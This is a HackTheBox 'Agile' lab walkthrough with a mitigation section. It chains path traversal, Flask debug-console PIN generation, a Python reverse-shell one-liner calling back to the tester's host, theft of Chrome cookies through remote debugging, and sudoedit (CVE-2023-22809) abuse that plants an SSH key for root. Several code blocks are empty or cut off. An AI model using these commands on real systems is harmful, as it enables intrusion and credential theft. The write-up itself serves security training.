In Agile, I had to exploit a password manager to read arbitrary files on a server. I used the information from those files to generate the PIN for the Flask debug console. Then, I read the cookies from Chrome running in debug to access the password of another user. And finally, used `sudoedit` to gain root access.

## Enumeration

As always, I started the box by looking for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |

There were 2 open ports: 22 (SSH) and 80 (HTTP).

The website was redirecting to 'superpass.htb'. I added that to my hosts file and checked for subdomains.

```bash

## Website

I opened a browser and navigated to 'http://superpass.htb'.

![SuperPassword Site](/assets/images/2023/04/Agile/SuperPassSite.png "SuperPassword Site")

It was a password manager. I ran Feroxbuster to look for hidden pages, but everything it found was redirecting to the login page.

![Login Page](/assets/images/2023/04/Agile/Login.png "Login Page")

I tried simple SQL and NoSQL injection payloads in the login form. Nothing worked, but the site kept throwing errors.

![Errors](/assets/images/2023/04/Agile/ErrorOnLogin.png "Errors")

It was a Flask app deployed in debug mode. The error page had buttons to access the debug console, but it required a PIN.

I used the 'Register' page to create an account and log in the application.

![Vault](/assets/images/2023/04/Agile/Vault.png "Vault")

Once logged in, I was able to add passwords to the vault, and export them.

I tried using `flask-unsign` to crack the Flask session cookie with no luck.

```bash
$ flask-unsign --unsign --cookie '.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d_0Bt8flrUuKQ.ZBWqpA.WZ-VyfH3Row6THCWm9FyCNu6QAE' --wordlist /usr/share/seclists/rockyou.txt --no-literal-eval

```

## Export
I added a password and tried to export it. The export button sent a GET request to '/vault/export', and I got redirected to the download URL.

```http

```

The URL I was redirected to was interesting. It contained my username, the word 'export', and what looked like 10 random characters.

The other interesting part of the URL is that the `fn` parameter looked like it could be used to read files from the server. I tried reading '/etc/passwd'.

```http

```

It gave me an error.

```http

But the error showed that the path I gave was appended to '/tmp/'. I tried again by adding '..' at the beginning of my path.

```http

I got the file back.

From [OpenSource](https://erichogue.ca/2022/10/HTB/OpenSource), I knew that if I could read files for the server, I could generate the Flask debugging console PIN. I extracted the information I needed and generated the PIN. I failed. I spent a lot of time trying to generate the correct PIN, re-extracting all the files, using different users, ... Everything failed.

I use the file read vulnerability to extract all the sites source files.

I found a password in a configuration file.

```json
{"SQL_URI": "mysql+pymysql://superpassuser:REDACTED@localhost/superpass"}
```

I tried connecting to the application and SSH with that password. It failed.

## Passwords Export Brute Force

From the source code, I found how the export filename was generated.

```python
def generate_csv(user):

    rand = get_random(10)
    fn = f'{user.username}_export_{rand}.csv'
    path = f'/tmp/{fn}'

def get_random(chars=20):
    return hashlib.md5(str(datetime.datetime.now()).encode() + b"SeCReT?!").hexdigest()[:chars]
```

The code was using the first 10 characters of the MD5 hash of the current time to generate the 'random' part of the filename. I thought this might be vulnerable, but I did not know any other usernames. And I could not know when any other users would have used the export.

I tried it anyway. I looked at the login code.

```python
def login_user(username: str, password: str) -> Optional[User]:
    session = db_session.create_session()
    user = session.query(User).filter(User.username == username).first()

    if user and hasher.verify(password, user.hashed_password):
        session.close()
        return user
    session.close()
    return None
```

The code was reading the user from the database. And if the user existed, it would try to verify the hash. From this I knew that a login request would take longer if the username existed in the database. I wrote a script to find usernames.

```python

import requests
import sys

def try_username(username):
    url = 'http://superpass.htb/account/login'
    data = {'username': username, 'password': 'aaa'}

    response = requests.post(url, data)

    return response.elapsed.total_seconds() > 0.1

if len(sys.argv) != 2:
    print(f"Usage:\n{sys.argv[0]} FILENAME\n")
    exit()

filename = sys.argv[1]
file = open(filename, 'r')
count = 0
for line in file:
    username = line.strip()
    if try_username(username):
        print(username)

    count += 1
    if count % 100 == 0:
        print(count, file=sys.stderr)
```

I ran the script, but it returned way too many false positive. The fact that I was trying other things while it ran probably did not help.

From the passwd file, I knew that the box had a user called 'corum', so I tried to brute force their export filename. I did not have much hope. The code used microseconds, it made for way too many possibilities. But I tried anyway.

```python
#!/usr/bin/env python3

import datetime
import hashlib
import requests

session = ".eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZBdL1A.pWh1lNi9qX-RudtQzK-GIiKP5Ig"

def request_file(file_name, use_proxy):
    proxy_servers = {
        'http': 'http://localhost:8080',
    }

    s = requests.Session()
    if use_proxy:
        s.proxies = proxy_servers

    url = f'http://superpass.htb/download?fn={file_name}'
    cookie = {"session": session}
    response = s.get(url, cookies=cookie)

    if 200 == response.status_code:
        return response.text.strip()

    return ''

chars = 10
time = datetime.datetime.now()
delta = datetime.timedelta(microseconds=-1)
count = 0

while True:
    use_proxy = False
    if count % 100 == 0:
        print(time)
        use_proxy = True

    rand =  (hashlib.md5(str(time).encode() + b"SeCReT?!").hexdigest()[:chars])
    file = f'corum_export_{rand}.csv'
    value = request_file(file, use_proxy)
    if value:
        print(file)
        print(value)
        exit()

    time = time + delta
    count += 1
```

I ran the script for a while. It did not find any existing export file.

## Finally The PIN

After losing a few hours, I went back to trying to generate the PIN.

I used the file read vulnerability to see how the application was executed. It used [venv](https://docs.python.org/3/library/venv.html).

```http
GET /download?fn=../proc/self/cmdline HTTP/1.1
```

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 16 Apr 2023 14:41:03 GMT
Content-Type: text/csv; charset=utf-8

```

I tried running it locally to see if any values would be different. After way too long, I found that I needed to use 'wsgi_app' instead of 'Flask' for the application name.

I used the file extracted from the server to create a script that would read the needed data and generate a PIN.

            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name

print(get_pin_and_cookie_name())
```

I generated the PIN.

```bash
$ ./generate_pin.py
['www-data', 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py']

('135-148-084', '__wzd663740a50e34b3fe93a8')
```

I was able to use it in the debug console. And from there, getting a reverse shell was easy.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...

```

## User corum

Once connected to the server, I tried using the MySQL credentials to read the database. MySQL did not work well in the reverse shell, so I use [Chisel](https://github.com/jpillora/chisel) to open a reverse tunnel.


I opened the server on my machine.

```bash
./chisel server -p 3477 --reverse
```

And connected to it from the server.

```bash
./chisel client 10.10.14.8:3477 R:3306:127.0.0.1:3306/tcp
```

With the tunnel opened, I was able to use the MySQL client on my machine to connect to the MySQL server on the box.

```sql
mysql -usuperpassuser -h 127.0.0.1 -p

Once on the server, I looked at ways to get more privileges.

```bash

The Chrome sandbox had the suid bit set. I tried to run it, but I did not see how to abuse it.

When I ran `ps`, I saw Chrome again.

Chrome was running with remote debugging enabled.

```bash

```

After some research, I found a [blog post](https://mango.pdf.zone/stealing-chrome-cookies-without-a-password) and a [GitHub repository](https://github.com/defaultnamehere/cookie_crimes) that explained how to use the Chrome API to read all the cookies from an instance running with remote debugging.

I started an SSH tunnel to be able to reach the Chrome debugging API from my machine.

```bash
$ ssh -L 9222:localhost:41829 corum@target
corum@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)
```

I had to make a few changes to the script to get it to work, but I got it to extract the cookies to a test version of the password manager.

```bash
$ python cookie_crimes.py
[
    {
        "domain": "test.superpass.htb",
        "expires": 1711497543.559996,
        "httpOnly": true,
        "name": "remember_token",
        "path": "/",
        "priority": "Medium",
        "sameParty": false,
        "secure": false,
        "session": false,
        "size": 144,
        "sourcePort": 80,
        "sourceScheme": "NonSecure",
        "value": "1|REDACTED"
    },
    {
        "domain": "test.superpass.htb",
        "expires": -1,
        "httpOnly": true,
        "name": "session",
        "path": "/",
        "priority": "Medium",
        "sameParty": false,
        "secure": false,
        "session": true,
        "size": 215,
        "sourcePort": 80,
        "sourceScheme": "NonSecure",
        "value": "REDACTED"
    }
]
```

I looked at the configuration and saw that I could access the application directly on port 5555.

```bash
corum@agile:~$ cat /etc/nginx/sites-enabled/superpass-test.nginx
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;

    location /static {
        alias /app/app-testing/superpass/static;
        expires 365d;
    }
    location / {
        include uwsgi_params;
        proxy_pass http://127.0.0.1:5555;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
```

I started a new SSH tunnel on port 5555.

```bash
$ ssh -L 5555:127.0.0.1:5555 corum@target
corum@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)
```

I opened a browser to 'http://localhost:5555/' and I got served the test instance. I used the developer's tools of the browser to add the session cookie I stole.

![Test Vault](/assets/images/2023/04/Agile/TestVault.png "Test Vault")

I used edwards' password to SSH on the server.

```bash
$ ssh edwards@target
edwards@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

```

## Root

Once connected as edwards, I looked at what they could run with sudo.

```bash
edwards@agile:~$ sudo -l
[sudo] password for edwards:
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

They were able to edit two files as dev_admin.

The first file contains some database credentials.

```bash
edwards@agile:~$ sudoedit -u dev_admin /app/config_test.json
```

```json
{
    "SQL_URI": "mysql+pymysql://superpasstester:REDACTED@localhost/superpasstest"
}
```

The second file contained more credentials.

```
edwards@agile:~$ sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt
```

```
edwards:REDACTED
```

Those credentials were used in the site's integration tests.

```bash
edwards@agile:/app$ cat /app/test_and_update.sh
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

I used the database credentials to connect to MySQL again. The database was similar to the previous one. It did not contain anything I could use.

I could modify both set of credentials, but this did not seem to be very useful. I found a  [vulnerability in sudoedit](https://www.linkedin.com/pulse/exploiting-sudoedit-security-flaw-cve-2023-22809-/) that allowed editing arbitrary files. I tried to edit various files, but dev_admin was not allowed to edit them.

I saw that they could modify the activate file that was included in the test script. I tried to modify it and add some code to see how it would behave.

I ran this command:

```bash
EDITOR='nano -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
```

I added a simple touch command at the beginning of the file to create a file in '/tmp'. After a few seconds, the file was created, and it belonged to root.

```bash
edwards@agile:~$ ls -lt /tmp/
total 36
-rw-r--r-- 1 root   root      0 Apr 16 16:22 pwn
```

Since the script ran as root, I copied my SSH public key in a file in edwards' home folder. Then I modified the script to copy it in root's home by adding these lines to the 'activate' script.

```bash
mkdir /root/.ssh
chmod 700 /root/.ssh
cp /home/edwards/authorized_keys /root/.ssh/
chmod 600 /root/.ssh/authorized_keys
```

I waited a minute to make sure the cron ran. And then tried connecting as root with my SSH key.

```bash
$ ssh root@target
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

...

root@agile:~# cat root.txt
REDACTED
```

## Mitigation

The first problem with the application was in the CSV download. There was no protection against reading any file on the server. A simple fix would be to make sure that the file was in '/tmp' folder.

```python
def download():
    r = flask.request
    fn = r.args.get('fn')

    # Validate the requested file is in /tmp
    full_name = os.path.join('/tmp/', fn)
    real = os.path.realpath(full_name)
    if not real.startswith('/tmp/'):
        flask.abort(500)

    with open(real, 'rb') as f:
        data = f.read()
    resp = flask.make_response(data)
    resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'
    resp.mimetype = 'text/csv'
    return resp
```

This is better, but still allows reading any files '/tmp'. We could add a check for the username, but it would be better to generate the file when requested, and send it directly without using a redirection.

The next issues were with the debug mode used in the box. The web application was running with Flask in debug. And Chrome was also running with the debug port opened. The box would have been safer if debug was not used on the server.

The application stored password in clear in the database. Those passwords could not be hashed as they needed to be retrieved, but they should have been encrypted. It would have made reading them a lot harder. But still possible I might have been able to find how the application decrypt them and use that.

The last issue on the box was using a vulnerable version of 'sudoedit'. Anything with 'sudo' is very sensitive and should always be kept up to date to prevent issues.

And root should probably not source files that can be edited by someone else.

```bash
root@agile:/app/app/superpass# crontab -l
SHELL=/bin/bash
BASH_ENV=/etc/bash.bashrc
# m h  dom mon dow   command
#* * * * * curl -sI http://test.superpass.htb | grep -q "HTTP/1.1 200 OK" || service superpass-tests restart
#* * * * * curl -sI http://superpass.htb | grep -q "HTTP/1.1 200 OK" || service superpass restart
* * * * * source /app/venv/bin/activate
...
```
